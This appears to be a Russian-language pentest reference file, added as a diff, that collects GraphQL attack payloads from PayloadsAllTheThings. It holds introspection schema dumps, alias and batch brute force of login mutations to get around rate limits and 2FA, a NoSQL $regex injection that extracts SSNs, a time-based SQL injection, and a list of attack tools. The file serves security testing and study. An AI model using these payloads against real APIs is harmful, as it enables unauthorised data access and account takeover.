@@ -1,0 +1,242 @@
+{
+  "category": "GraphQL Injection",
+  "source": "PayloadsAllTheThings/GraphQL Injection/",
+  "entries": [
+    {
+      "subcategory": "Обнаружение эндпоинта",
+      "title": "Типовые пути GraphQL-эндпоинтов",
+      "language": "text",
+      "tags": ["detection", "graphql", "recon"],
+      "body": "/v1/explorer\n/v1/graphiql\n/graph\n/graphql\n/graphql/console/\n/graphql.php\n/graphiql\n/graphiql.php"
+    },
+    {
+      "subcategory": "Обнаружение эндпоинта",
+      "title": "Где искать и как пробить эндпоинт",
+      "language": "text",
+      "tags": ["detection", "recon", "methodology"],
+      "body": "GraphQL-эндпоинты часто лежат на предсказуемых путях. Самые частые:\n• /graphql\n• /graphiql — интерактивная IDE\nВсегда проверяй и API, и dev/debug-интерфейсы.\nРасширенный словарь: SecLists/Discovery/Web-Content/graphql.txt."
+    },
+    {
+      "subcategory": "Обнаружение эндпоинта",
+      "title": "Поиск точки инъекции — GET-эндпоинт",
+      "language": "http",
+      "tags": ["detection", "graphql", "recon"],
+      "body": "GET /graphql?query={yourQueryHere}\nGET /graphql?query={__schema{types{name}}}\nGET /graphiql?query={__schema{types{name}}}\nGET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D"
+    },
+    {
+      "subcategory": "Обнаружение эндпоинта",
+      "title": "Поиск точки инъекции — POST-эндпоинт",
+      "language": "http",
+      "tags": ["detection", "graphql", "recon"],
+      "body": "POST /graphql/v1 HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n\"query\": \"query { user { id name } }\"\n}"
+    },
+    {
+      "subcategory": "Обнаружение эндпоинта",
+      "title": "Проверка видимости ошибок (битые запросы)",
+      "language": "graphql",
+      "tags": ["detection", "error-based"],
+      "body": "?query={__schema}\n?query={}\n?query={thisdefinitelydoesnotexist}"
+    },
+    {
+      "subcategory": "Обнаружение эндпоинта",
+      "title": "Схема: GraphQL отдаёт логин и пароль (HTB Help)",
+      "language": "image",
+      "tags": ["detection", "graphql", "example"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/graphql-injection/htb-help.png",
+        "caption": "Запрос GET /graphql?query={user{username,password}} возвращает в JSON username \"helpme@helpme.com\" и хеш пароля. Пример из HTB Help — данные отдаются без авторизации. Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Интроспекция",
+      "title": "Минимальный интроспекционный запрос",
+      "language": "json",
+      "tags": ["introspection", "graphql", "enumeration"],
+      "body": "{\n  \"query\": \"{ __schema { types { name } } }\"\n}"
+    },
+    {
+      "subcategory": "Интроспекция",
+      "title": "Как работает интроспекция",
+      "language": "text",
+      "tags": ["introspection", "methodology"],
+      "body": "В спецификации GraphQL есть служебные поля __schema и __type — они позволяют клиенту спросить у сервера, какие типы существуют, какие поля они отдают и как всё связано.\nИменно на этом построены автодополнение и инлайн-документация в GraphiQL и GraphQL Playground: инструмент не угадывает, а заранее спрашивает у сервера, что валидно.\nДля атакующего интроспекция — это полный дамп схемы: типы, поля, аргументы, мутации."
+    },
+    {
+      "subcategory": "Интроспекция",
+      "title": "Полный дамп схемы (IntrospectionQuery, URL-encoded)",
+      "language": "text",
+      "tags": ["introspection", "dump", "url-encoded"],
+      "body": "fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}"
+    },
+    {
+      "subcategory": "Интроспекция",
+      "title": "Полный дамп схемы (IntrospectionQuery, URL-decoded)",
+      "language": "graphql",
+      "tags": ["introspection", "dump", "schema"],
+      "body": "fragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n\nquery IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}"
+    },
+    {
+      "subcategory": "Интроспекция",
+      "title": "Дамп схемы одной строкой без фрагментов",
+      "language": "graphql",
+      "tags": ["introspection", "dump", "oneliner"],
+      "body": "__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}"
+    },
+    {
+      "subcategory": "Интроспекция",
+      "title": "Дамп схемы одной строкой с фрагментами",
+      "language": "graphql",
+      "tags": ["introspection", "dump", "oneliner"],
+      "body": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"
+    },
+    {
+      "subcategory": "Перечисление схемы",
+      "title": "Перечисление схемы через подсказки (suggestions)",
+      "language": "json",
+      "tags": ["enumeration", "suggestions", "bypass"],
+      "body": "{\n  \"message\": \"Cannot query field \\\"one\\\" on type \\\"Query\\\". Did you mean \\\"node\\\"?\",\n}"
+    },
+    {
+      "subcategory": "Перечисление схемы",
+      "title": "Подсказки и брутфорс при отключённой интроспекции",
+      "language": "text",
+      "tags": ["enumeration", "suggestions", "bruteforce"],
+      "body": "Если ввести неизвестное поле, бэкенд GraphQL часто возвращает подсказку с похожим именем из схемы (Did you mean ...?).\nЭто даёт перечисление схемы даже когда интроспекция отключена.\nКогда схема недоступна, можно брутфорсить известные имена полей и типов словарями вроде Escape-Technologies/graphql-wordlist."
+    },
+    {
+      "subcategory": "Перечисление схемы",
+      "title": "Перечисление определения типа (на примере User)",
+      "language": "graphql",
+      "tags": ["enumeration", "type", "schema"],
+      "body": "{__type (name: \"User\") {name fields{name type{name kind ofType{name kind}}}}}"
+    },
+    {
+      "subcategory": "Перечисление схемы",
+      "title": "Поиск путей до целевого типа (graphql-path-enum)",
+      "language": "bash",
+      "tags": ["enumeration", "path-enum", "tooling"],
+      "body": "graphql-path-enum -i ./test_data/h1_introspection.json -t Skill\nFound 27 ways to reach the \"Skill\" node from the \"Query\" node:\n- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n- Query (query) -> Query (skills) -> Skill"
+    },
+    {
+      "subcategory": "Перечисление схемы",
+      "title": "Зачем искать пути до типа",
+      "language": "text",
+      "tags": ["enumeration", "path-enum", "methodology"],
+      "body": "После интроспекции не всегда очевидно, как добраться до нужного типа (User, Admin, Payment) — объект бывает доступен через несколько точек входа и вложенных связей.\ngraphql-path-enum берёт JSON-вывод интроспекции, анализирует связи типов и выдаёт все пути запросов, которыми можно дотянуться до целевого объекта, даже глубоко вложенного или экспонированного косвенно."
+    },
+    {
+      "subcategory": "Запросы",
+      "title": "Базовый запрос (shorthand)",
+      "language": "graphql",
+      "tags": ["query", "graphql", "methodology"],
+      "body": "{\n  user {\n    id\n    name\n  }\n}"
+    },
+    {
+      "subcategory": "Запросы",
+      "title": "Базовый запрос (полный синтаксис с query)",
+      "language": "graphql",
+      "tags": ["query", "graphql", "methodology"],
+      "body": "query {\n  user {\n    id\n    name\n  }\n}"
+    },
+    {
+      "subcategory": "Запросы",
+      "title": "Запрос с аргументами (точка входа для IDOR)",
+      "language": "graphql",
+      "tags": ["query", "idor", "arguments"],
+      "body": "{\n  user(id: \"1\") {\n    name\n    email\n  }\n}"
+    },
+    {
+      "subcategory": "Запросы",
+      "title": "Вложенный запрос (обход связей за один запрос)",
+      "language": "graphql",
+      "tags": ["query", "nested", "graphql"],
+      "body": "{\n  user(id: \"1\") {\n    name\n    posts {\n      title\n      comments {\n        content\n      }\n    }\n  }\n}"
+    },
+    {
+      "subcategory": "Запросы",
+      "title": "Заметки по запросам и IDOR",
+      "language": "text",
+      "tags": ["query", "idor", "methodology"],
+      "body": "GraphQL поддерживает три типа операций: queries, mutations, subscriptions.\n• Структура запроса в точности повторяет структуру JSON-ответа: запрашиваешь только нужные поля.\n• Аргументы у полей работают как параметры функции (id, фильтры, поиск) — это частая точка входа для проверки контроля доступа и IDOR.\n• Вложенные запросы позволяют за один запрос обойти связи (user -> posts -> comments) вместо цепочки REST-вызовов."
+    },
+    {
+      "subcategory": "Мутации",
+      "title": "Mutation — логин и создание пользователя",
+      "language": "graphql",
+      "tags": ["mutation", "graphql", "abuse"],
+      "body": "mutation{\n  signIn(login:\"Admin\", password:\"secretp@ssw0rd\"){\n      token\n    }\n}\n\nmutation{\n  addUser(id:\"1\", name:\"Dan Abramov\", email:\"dan@dan.com\") {\n    id\n    name\n    email\n  }\n}"
+    },
+    {
+      "subcategory": "Мутации",
+      "title": "Заметки по мутациям",
+      "language": "text",
+      "tags": ["mutation", "methodology"],
+      "body": "Мутация — операция, изменяющая данные на сервере (create / update / delete).\nМутации работают как функции: ими взаимодействуют с GraphQL-эндпоинтом.\nВажно: мутации обычно НЕ работают через GET (graphql-over-http issue #123)."
+    },
+    {
+      "subcategory": "Батчинг и алиасы",
+      "title": "Батчинг через JSON-массив запросов",
+      "language": "json",
+      "tags": ["batching", "bruteforce", "rate-limit"],
+      "body": "[\n    {\n        \"query\":\"...\"\n    },{\n        \"query\":\"...\"\n    }\n    ,{\n        \"query\":\"...\"\n    }\n    ,{\n        \"query\":\"...\"\n    }\n    ...\n]"
+    },
+    {
+      "subcategory": "Батчинг и алиасы",
+      "title": "Батчинг по имени запроса",
+      "language": "json",
+      "tags": ["batching", "bruteforce", "rate-limit"],
+      "body": "{\n    \"query\": \"query { qname: Query { field1 } qname1: Query { field1 } }\"\n}"
+    },
+    {
+      "subcategory": "Батчинг и алиасы",
+      "title": "Брутфорс через алиасы в одной мутации",
+      "language": "graphql",
+      "tags": ["batching", "aliasing", "bruteforce"],
+      "body": "mutation {\n  login(pass: 1111, username: \"bob\")\n  second: login(pass: 2222, username: \"bob\")\n  third: login(pass: 3333, username: \"bob\")\n  fourth: login(pass: 4444, username: \"bob\")\n}"
+    },
+    {
+      "subcategory": "Батчинг и алиасы",
+      "title": "Зачем батчинг и алиасы",
+      "language": "text",
+      "tags": ["batching", "rate-limit", "methodology"],
+      "body": "Батчинг GraphQL позволяет отправить несколько запросов в одном HTTP-запросе (массив операций в теле). Сервер обработает каждую операцию и вернёт массив ответов.\nТиповые сценарии злоупотребления:\n• Усиление брутфорса пароля (много попыток за один запрос).\n• Обход rate limit.\n• Обход 2FA.\nАлиасы (second:, third: ...) позволяют вызвать одну и ту же мутацию много раз в одном запросе — тот же эффект для брутфорса."
+    },
+    {
+      "subcategory": "Инъекции через резолверы",
+      "title": "NoSQL-инъекция через $regex в параметре поиска",
+      "language": "graphql",
+      "tags": ["nosqli", "injection", "regex"],
+      "body": "{\n  doctors(\n    options: \"{\\\"limit\\\": 1, \\\"patients.ssn\\\" :1}\", \n    search: \"{ \\\"patients.ssn\\\": { \\\"$regex\\\": \\\".*\\\"}, \\\"lastName\\\":\\\"Admin\\\" }\")\n    {\n      firstName lastName id patients{ssn}\n    }\n}"
+    },
+    {
+      "subcategory": "Инъекции через резолверы",
+      "title": "SQL-инъекция — пробой одинарной кавычкой",
+      "language": "graphql",
+      "tags": ["sqli", "injection", "detection"],
+      "body": "{ \n    bacon(id: \"1'\") { \n        id, \n        type, \n        price\n    }\n}"
+    },
+    {
+      "subcategory": "Инъекции через резолверы",
+      "title": "SQL-инъекция внутри поля GraphQL (stacked + sleep)",
+      "language": "graphql",
+      "tags": ["sqli", "injection", "time-based"],
+      "body": "query {\n  user(name: \"patt';SELECT 1;SELECT pg_sleep(30);--'\") {\n    id\n    email\n  }\n}"
+    },
+    {
+      "subcategory": "Инъекции через резолверы",
+      "title": "Заметка по SQLi/NoSQLi в GraphQL",
+      "language": "text",
+      "tags": ["injection", "sqli", "nosqli"],
+      "body": "GraphQL — лишь слой между клиентом и базой, поэтому SQL- и NoSQL-инъекции по-прежнему возможны.\nПробуй пропихнуть payload в любой параметр резолвера (id, name, search, фильтры).\n• SQLi: одинарная кавычка ' для пробоя, затем stacked-queries и time-based (pg_sleep).\n• NoSQLi: JSON-операторы вроде $regex внутри строковых параметров-фильтров."
+    },
+    {
+      "subcategory": "Инструменты",
+      "title": "Инструменты для атак на GraphQL",
+      "language": "text",
+      "tags": ["tools", "graphql", "tooling"],
+      "body": "GraphQLmap — движок для взаимодействия с GraphQL-эндпоинтом при пентесте.\nInQL (doyensec) — расширение Burp для тестирования безопасности GraphQL.\nGQLSpection — парсит схему интроспекции и генерирует возможные запросы.\ngraphql-path-enum — перечисляет способы добраться до заданного типа в схеме.\nclairvoyancex — восстанавливает схему GraphQL при отключённой интроспекции.\nCrackQL — брутфорс паролей и фаззинг GraphQL.\ngraphql-cop — аудитор безопасности GraphQL API.\ngraphw00f — фингерпринтинг движка GraphQL-сервера.\ngraphql-voyager — визуализация любого GraphQL API в виде интерактивного графа."
+    }
+  ]
+}
